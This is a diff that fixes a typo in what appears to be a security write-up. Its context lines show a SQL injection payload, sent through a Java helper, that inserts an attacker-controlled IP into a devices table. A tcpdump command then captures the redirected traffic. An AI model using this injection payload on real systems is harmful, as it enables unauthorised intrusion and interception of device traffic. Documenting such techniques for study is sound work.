@@ -532,7 +532,7 @@ What if I could insert another IP into the devices table and use `setTemp` comma
 ```java
 System.out.println(PayloadRequest.sendCommand("';INSERT INTO devices(ip) values('X.X.X.X'); commit#", "", "getTemp"));
 ```
-Ok, it worked. I have my IP address as a device. Now let's run tcpdump [6] on my server (X.X.X.X) to capture all network traffic. Lastly, we need to send some resquests with `getTemp` and `setTemp` commands.
+Ok, it worked. I have my IP address as a device. Now let's run tcpdump [6] on my server (X.X.X.X) to capture all network traffic. Lastly, we need to send some requests with `getTemp` and `setTemp` commands.
 
 `# tcpdump -i eth0 -nnvvXS`
 
